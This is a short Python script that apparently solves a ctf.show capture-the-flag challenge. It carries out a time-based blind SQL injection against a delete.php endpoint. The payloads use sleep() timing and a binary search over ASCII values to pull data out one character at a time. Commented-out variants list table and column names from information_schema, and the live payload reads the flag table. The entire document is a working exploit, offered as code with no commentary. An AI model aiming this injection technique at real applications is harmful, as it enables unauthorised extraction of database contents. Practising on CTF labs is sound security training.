import requests
import time


url="http://13edf9c3-53b9-4eab-9143-8599933ea443.challenge.ctf.show:8080/api/delete.php"
flag=''
for i in range(1,100):
    low=32
    high=128
    mid=(low+high)//2
    while low<high:
        # payload="if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},sleep(0.05),1)".format(i,mid)
        # payload="if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{},1))<{},sleep(0.05),1)".format(i,mid)
        payload="if(ascii(substr((select group_concat(flag) from flag),{},1))>{},sleep(0.05),0)".format(i,mid)
        
        data={
            "id":payload,
            
        }
        time1=time.time()
        r=requests.post(url,data=data)
        time2=time.time()
        
        print(time2-time1)
        print(low,mid,high)
        time.sleep(0.05)

        if time2-time1>0.5:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
    flag+=chr(mid)
    print(flag)
    if mid==32:
        print(flag)  
        break




























